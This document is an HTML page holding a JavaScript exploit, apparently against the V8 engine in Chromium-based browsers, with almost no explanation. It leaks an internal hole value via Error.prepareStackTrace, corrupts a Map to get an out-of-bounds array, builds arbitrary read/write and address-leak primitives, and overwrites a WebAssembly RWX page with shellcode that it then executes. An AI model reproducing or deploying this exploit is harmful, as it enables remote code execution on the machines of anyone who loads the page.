<html>
<head>
</head>

<body>
    exp
</body>
<script>
    var bs = new ArrayBuffer(8);
    var fs = new Float64Array(bs);
    var is = new BigUint64Array(bs);

    function ftoi(val) {
      fs[0] = val;
      return is[0];
    }

    function itof(val) {
      is[0] = val;
      return fs[0];
    }

    function foo() {
      const _x = a => (a => a.x())(a);
      const _y = (a, b) => b.y(a, b, 1);

      const _z = i => {
        Error.prepareStackTrace = (_, x) => x[i].getThis();
        return Error().stack;
      };

      function X() {}

      X.prototype.x = () => {
        let z = _z(3);
        z[0] = 0;
        e = { x: z, y: _z(3) };
      };

      X.prototype.y = function(a, b) {
        'use strict';
        _x.call(arguments, b);
        return arguments[a];
      }

      let e = null;

      let x = new X();
      for (let i = 0; i < 10000; i++)
        _y(1, x);

      delete e.x[0];
      return e.y[0];
    }

    function bar() {
      let hole = foo();

      let m = new Map();
      m.set(1, 1);
      m.set(hole, 1);
      m.delete(hole);
      m.delete(hole);
      m.delete(1);
      //alert(m.size);
      let a = new Array(1.1, 2.2);
      m.set(16, -1);
      m.set(a, 1337); 

      return a;
    }

    let oob = bar();

    /* flt.elements @ oob[7] */
    /* obj.elements @ oob[19] */
    let flt = [1.1];
    let tmp = {a: 1};
    let obj = [tmp];

    
    function addrof(o) {
      let a = ftoi(oob[19]) >> 32n;
      let c = ftoi(oob[7]) & 0xffffffffn;
      oob[7] = itof((a << 32n) + c);
      obj[0] = o;
      return (ftoi(flt[0]) & 0xffffffffn) - 1n;
    }
    

    function read(p) {
      let a = ftoi(oob[7]) & 0xffffffffn;
      oob[7] = itof(((p - 8n + 1n) << 32n) + a);
      return ftoi(flt[0]);
    }

    function write(p, x) {
      let a = ftoi(oob[7]) & 0xffffffffn;
      oob[7] = itof(((p - 8n + 1n) << 32n) + a);
      flt[0] = itof(x);
    }

    var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule);
    var f = wasmInstance.exports.main;    
    function copy_shellcode(shellcode){
        let temp_buf = new ArrayBuffer(0x100);
        let view = new DataView(temp_buf);
        let backing_store_addr = addrof(temp_buf) + 0x14n;
	//alert(backing_store_addr.toString(16));
	for(let x = 0n; x < 0x60n; x += 4n) {
		read(addrof(temp_buf)+x).toString(16);
	}
	//alert(read(backing_store_addr).toString(16));
        write(backing_store_addr, rwx_addr);
        for(let i = 0; i<shellcode.length; i++){
            view.setUint8(i, shellcode[i]);
        }
    }
    let wasmAddr = addrof(wasmInstance);
    var shared = (read(addrof(f)+0xcn) - 1n) & 0xffffffffn;
    alert(shared.toString(16));
    var func_data = ((read(shared + 0x4n)-1n) & 0xffffffffn);
    alert(func_data.toString(16));
    var ins_obj = (read(func_data + 0x8n) - 1n) & 0xffffffffn;
    alert("0x" + ins_obj.toString(16));
    var rwx_addr = read(ins_obj+60n)&0xffffffffn;
    alert("0x" + rwx_addr.toString(16));
    var shellcode = [254, 255, 255, 234];
    copy_shellcode(shellcode);
    f();
    
</script>

</html>
